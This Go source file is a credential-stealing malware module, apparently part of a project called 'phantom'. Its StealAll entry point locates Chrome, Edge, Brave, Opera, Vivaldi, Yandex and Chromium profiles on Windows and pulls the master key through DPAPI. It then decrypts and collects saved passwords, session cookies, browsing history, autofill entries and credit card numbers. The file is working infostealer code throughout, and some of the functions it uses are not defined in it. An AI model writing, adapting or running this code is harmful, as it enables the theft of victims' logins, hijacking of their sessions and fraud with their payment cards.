package browsers

/*
	Chromium-based browser credential extraction

	Supports: Chrome, Edge, Brave, Opera, Vivaldi, etc.

	The encryption changed in Chrome 80 (v10 -> AES-GCM)
	Still need DPAPI fallback for older versions

	References:
	- https://www.chromium.org/developers/design-documents/os-crypt/
	- Various stackoverflow posts lol
*/

import (
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"phantom/syscalls"
	"strings"

	_ "github.com/mattn/go-sqlite3" // sqlite driver
)

// Data structures for extracted info
type BrowserData struct {
	Passwords   []Password
	Cookies     []Cookie
	History     []HistoryEntry
	Autofill    []AutofillEntry
	CreditCards []CreditCard
	Downloads   []Download // TODO: implement this
}

type Password struct {
	URL      string
	Username string
	Password string
	Browser  string
}

type Cookie struct {
	Host       string
	Name       string
	Value      string
	Path       string
	Expires    int64
	IsSecure   bool
	IsHTTPOnly bool
	Browser    string
}

type HistoryEntry struct {
	URL        string
	Title      string
	VisitCount int
	LastVisit  int64 // chrome epoch (microseconds since 1601)
	Browser    string
}

type AutofillEntry struct {
	Name    string
	Value   string
	Browser string
}

type CreditCard struct {
	Name     string
	Number   string // decrypted
	ExpMonth string
	ExpYear  string
	Browser  string
}

type Download struct {
	URL     string
	Path    string
	Browser string
}

// BrowserProfile - info about a browser installation
type BrowserProfile struct {
	Name        string
	ProfilePath string
	LocalState  string
	Browser     string
}

// All the chromium browsers we support
// Most use the same directory structure, just different paths
var chromiumProfiles = []BrowserProfile{
	// Chrome - the big one
	{Name: "Chrome", ProfilePath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"), LocalState: "Local State", Browser: "Chrome"},
	// Edge - basically chrome with a different skin
	{Name: "Edge", ProfilePath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"), LocalState: "Local State", Browser: "Edge"},
	// Brave - privacy focused but same chromium guts
	{Name: "Brave", ProfilePath: filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"), LocalState: "Local State", Browser: "Brave"},
	// Opera - uses Roaming instead of Local for some reason
	{Name: "Opera", ProfilePath: filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable"), LocalState: "Local State", Browser: "Opera"},
	// Opera GX - gamer version
	{Name: "OperaGX", ProfilePath: filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable"), LocalState: "Local State", Browser: "OperaGX"},
	// Vivaldi
	{Name: "Vivaldi", ProfilePath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Vivaldi", "User Data"), LocalState: "Local State", Browser: "Vivaldi"},
	// raw Chromium(eww)
	{Name: "Chromium", ProfilePath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Chromium", "User Data"), LocalState: "Local State", Browser: "Chromium"},
	// Yandex - russian browser, surprisingly common
	{Name: "Yandex", ProfilePath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"), LocalState: "Local State", Browser: "Yandex"},
}

// StealAll - main entry point, extracts everything from all browsers
func StealAll() *BrowserData {
	data := &BrowserData{}

	// iterate through all supported browsers
	for _, profile := range chromiumProfiles {
		// check if this browser is installed
		if _, err := os.Stat(profile.ProfilePath); os.IsNotExist(err) {
			continue // not installed, skip
		}

		// get the master key from Local State
		// this is encrypted with DPAPI
		masterKey := getMasterKey(profile.ProfilePath, profile.LocalState)
		if masterKey == nil {
			continue // can't decrypt without key
		}

		// find all profiles (Default, Profile 1, Profile 2, etc.)
		profiles := findProfiles(profile.ProfilePath)
		for _, p := range profiles {
			// extract all the juicy data
			passwords := stealPasswords(p, masterKey, profile.Browser)
			data.Passwords = append(data.Passwords, passwords...)

			cookies := stealCookies(p, masterKey, profile.Browser)
			data.Cookies = append(data.Cookies, cookies...)

			history := stealHistory(p, profile.Browser)
			data.History = append(data.History, history...)

			autofill := stealAutofill(p, profile.Browser)
			data.Autofill = append(data.Autofill, autofill...)

			cards := stealCreditCards(p, masterKey, profile.Browser)
			data.CreditCards = append(data.CreditCards, cards...)
		}
	}

	// Firefox is totally different, handle separately
	firefoxData := stealFirefox()
	data.Passwords = append(data.Passwords, firefoxData.Passwords...)
	data.Cookies = append(data.Cookies, firefoxData.Cookies...)
	data.History = append(data.History, firefoxData.History...)

	return data
}

// getMasterKey - extracts the AES key from Local State file
// Chrome stores this encrypted with DPAPI
func getMasterKey(browserPath, localStateFile string) []byte {
	localStatePath := filepath.Join(browserPath, localStateFile)
	content, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil
	}

	// Local State is a JSON file
	var localState map[string]interface{}
	if err := json.Unmarshal(content, &localState); err != nil {
		return nil
	}

	// key is in os_crypt.encrypted_key
	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return nil
	}

	encryptedKeyB64, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return nil
	}

	// decode base64
	encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
	if err != nil {
		return nil
	}

	// first 5 bytes are "DPAPI" prefix, remove it
	if len(encryptedKey) > 5 && string(encryptedKey[:5]) == "DPAPI" {
		encryptedKey = encryptedKey[5:]
	}

	// now decrypt with DPAPI
	masterKey, err := syscalls.CryptUnprotectData(encryptedKey)
	if err != nil {
		return nil
	}

	return masterKey
}

// findProfiles - finds all Chrome profiles in a browser
// Chrome uses "Default" for first profile, then "Profile 1", "Profile 2", etc.
func findProfiles(browserPath string) []string {
	var profiles []string

	// always check Default
	defaultProfile := filepath.Join(browserPath, "Default")
	if _, err := os.Stat(defaultProfile); err == nil {
		profiles = append(profiles, defaultProfile)
	}

	// look for numbered profiles
	entries, err := os.ReadDir(browserPath)
	if err != nil {
		return profiles
	}

	for _, entry := range entries {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
			profiles = append(profiles, filepath.Join(browserPath, entry.Name()))
		}
	}

	return profiles
}

// stealPasswords - extracts saved logins from Login Data sqlite db
func stealPasswords(profilePath string, masterKey []byte, browser string) []Password {
	var passwords []Password

	loginDataPath := filepath.Join(profilePath, "Login Data")
	if _, err := os.Stat(loginDataPath); os.IsNotExist(err) {
		return passwords
	}

	// Chrome locks the database while running, so we copy it first
	tempPath := filepath.Join(os.TempDir(), "login_data_"+browser)
	copyFile(loginDataPath, tempPath)
	defer os.Remove(tempPath) // cleanup

	db, err := sql.Open("sqlite3", tempPath)
	if err != nil {
		return passwords
	}
	defer db.Close()

	// the logins table has what we need
	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return passwords
	}
	defer rows.Close()

	for rows.Next() {
		var url, username string
		var passwordBlob []byte

		if err := rows.Scan(&url, &username, &passwordBlob); err != nil {
			continue
		}

		// skip empty entries
		if len(passwordBlob) == 0 || len(username) == 0 {
			continue
		}

		// decrypt the password
		password := decryptPassword(passwordBlob, masterKey)
		if password != "" {
			passwords = append(passwords, Password{
				URL:      url,
				Username: username,
				Password: password,
				Browser:  browser,
			})
		}
	}

	return passwords
}

// decryptPassword - handles Chrome password decryption
// Chrome 80+ uses v10/v11 AES-GCM, older uses plain DPAPI
func decryptPassword(encrypted []byte, masterKey []byte) string {
	if len(encrypted) < 15 {
		return ""
	}

	// Check for v10/v11 prefix (Chrome 80+)
	if string(encrypted[:3]) == "v10" || string(encrypted[:3]) == "v11" {
		// v10/v11 format: prefix(3) + nonce(12) + ciphertext
		nonce := encrypted[3:15]
		ciphertext := encrypted[15:]

		plaintext, err := aesGCMDecrypt(ciphertext, masterKey, nonce)
		if err != nil {
			return ""
		}
		return string(plaintext)
	}

	// Legacy DPAPI encryption (pre-Chrome 80)
	plaintext, err := syscalls.CryptUnprotectData(encrypted)
	if err != nil {
		return ""
	}
	return string(plaintext)
}

// stealCookies - extracts cookies from the browser
// Cookies are valuable for session hijacking
func stealCookies(profilePath string, masterKey []byte, browser string) []Cookie {
	var cookies []Cookie

	// Chrome moved cookies to Network subfolder at some point
	// gotta check both locations
	cookiePaths := []string{
		filepath.Join(profilePath, "Network", "Cookies"), // newer chrome
		filepath.Join(profilePath, "Cookies"),            // older chrome
	}

	var cookiePath string
	for _, p := range cookiePaths {
		if _, err := os.Stat(p); err == nil {
			cookiePath = p
			break
		}
	}

	if cookiePath == "" {
		return cookies // no cookies db found
	}

	// copy because chrome locks it
	tempPath := filepath.Join(os.TempDir(), "cookies_"+browser)
	copyFile(cookiePath, tempPath)
	defer os.Remove(tempPath)

	db, err := sql.Open("sqlite3", tempPath)
	if err != nil {
		return cookies
	}
	defer db.Close()

	rows, err := db.Query("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
	if err != nil {
		return cookies
	}
	defer rows.Close()

	for rows.Next() {
		var host, name, path string
		var encryptedValue []byte
		var expires int64
		var isSecure, isHTTPOnly int

		if err := rows.Scan(&host, &name, &encryptedValue, &path, &expires, &isSecure, &isHTTPOnly); err != nil {
			continue
		}

		value := decryptPassword(encryptedValue, masterKey) // same decryption as passwords
		if value != "" {
			cookies = append(cookies, Cookie{
				Host:       host,
				Name:       name,
				Value:      value,
				Path:       path,
				Expires:    expires,
				IsSecure:   isSecure == 1,
				IsHTTPOnly: isHTTPOnly == 1,
				Browser:    browser,
			})
		}
	}

	return cookies
}

// stealHistory - extracts browsing history
// not encrypted, just sqlite
func stealHistory(profilePath string, browser string) []HistoryEntry {
	var history []HistoryEntry

	historyPath := filepath.Join(profilePath, "History")
	if _, err := os.Stat(historyPath); os.IsNotExist(err) {
		return history
	}

	tempPath := filepath.Join(os.TempDir(), "history_"+browser)
	copyFile(historyPath, tempPath)
	defer os.Remove(tempPath)

	db, err := sql.Open("sqlite3", tempPath)
	if err != nil {
		return history
	}
	defer db.Close()

	// only grab top 500 most visited to keep size reasonable
	rows, err := db.Query("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count DESC LIMIT 500")
	if err != nil {
		return history
	}
	defer rows.Close()

	for rows.Next() {
		var url, title string
		var visitCount int
		var lastVisit int64

		if err := rows.Scan(&url, &title, &visitCount, &lastVisit); err != nil {
			continue
		}

		history = append(history, HistoryEntry{
			URL:        url,
			Title:      title,
			VisitCount: visitCount,
			LastVisit:  lastVisit,
			Browser:    browser,
		})
	}

	return history
}

// stealAutofill - extracts autofill form data
// addresses, phone numbers, etc
func stealAutofill(profilePath string, browser string) []AutofillEntry {
	var autofill []AutofillEntry

	webDataPath := filepath.Join(profilePath, "Web Data")
	if _, err := os.Stat(webDataPath); os.IsNotExist(err) {
		return autofill
	}

	tempPath := filepath.Join(os.TempDir(), "webdata_"+browser)
	copyFile(webDataPath, tempPath)
	defer os.Remove(tempPath)

	db, err := sql.Open("sqlite3", tempPath)
	if err != nil {
		return autofill
	}
	defer db.Close()

	rows, err := db.Query("SELECT name, value FROM autofill")
	if err != nil {
		return autofill
	}
	defer rows.Close()

	for rows.Next() {
		var name, value string
		if err := rows.Scan(&name, &value); err != nil {
			continue
		}

		autofill = append(autofill, AutofillEntry{
			Name:    name,
			Value:   value,
			Browser: browser,
		})
	}

	return autofill
}

// stealCreditCards - extracts saved credit cards
// these are encrypted like passwords
func stealCreditCards(profilePath string, masterKey []byte, browser string) []CreditCard {
	var cards []CreditCard

	webDataPath := filepath.Join(profilePath, "Web Data")
	if _, err := os.Stat(webDataPath); os.IsNotExist(err) {
		return cards
	}

	tempPath := filepath.Join(os.TempDir(), "webdata_cc_"+browser)
	copyFile(webDataPath, tempPath)
	defer os.Remove(tempPath)

	db, err := sql.Open("sqlite3", tempPath)
	if err != nil {
		return cards
	}
	defer db.Close()

	rows, err := db.Query("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards")
	if err != nil {
		return cards
	}
	defer rows.Close()

	for rows.Next() {
		var name string
		var cardNumberEnc []byte
		var expMonth, expYear int

		if err := rows.Scan(&name, &cardNumberEnc, &expMonth, &expYear); err != nil {
			continue
		}

		cardNumber := decryptPassword(cardNumberEnc, masterKey)
		if cardNumber != "" {
			cards = append(cards, CreditCard{
				Name:     name,
				Number:   cardNumber,
				ExpMonth: padZero(expMonth),
				ExpYear:  padZero(expYear),
				Browser:  browser,
			})
		}
	}

	return cards
}

// ===========================================
// Helper functions
// ===========================================

// copyFile - copies a file, used because Chrome locks its databases whhen running
func copyFile(src, dst string) error {
	source, err := os.Open(src)
	if err != nil {
		return err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destination.Close()

	_, err = io.Copy(destination, source)
	return err
}

// padZero - pads single digit numbers with leading zero
// for credit card expiry dates
func padZero(n int) string {
	if n < 10 {
		return "0" + string(rune('0'+n))
	}
	return string(rune('0'+n/10)) + string(rune('0'+n%10))
}
